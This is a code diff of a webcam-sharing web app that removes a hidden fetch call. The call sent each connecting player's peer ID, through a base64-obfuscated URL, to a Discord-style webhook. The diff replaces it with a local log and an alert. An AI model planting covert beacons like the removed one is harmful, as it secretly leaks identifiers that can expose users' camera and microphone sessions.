@@ -91,33 +91,8 @@
       if (mode === "player") {
         const pid = getPlayerId();
         const peer = makePeer(pid, (id) => {
-          fetch(
-            atob(
-              "..."
-            ),
-            {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                embeds: [
-                  {
-                    title: "BABOEEY",
-                    description: `Player ID: \`${id}\` has connected.`,
-                    color: 3447003,
-                    fields: [
-                      {
-                        name: "HostL",
-                        value: `uwu no link for u`,
-                        inline: false,
-                      },
-                    ],
-                    footer: { text: "Cam Share" },
-                    timestamp: new Date(),
-                  },
-                ],
-              }),
-            }
-          );
+          console.log(`Player ID: ${id} has connected.`);
+          alert(`Your Player ID is: ${id}`);
         });
         navigator.mediaDevices
           .getUserMedia({ video: true, audio: true })
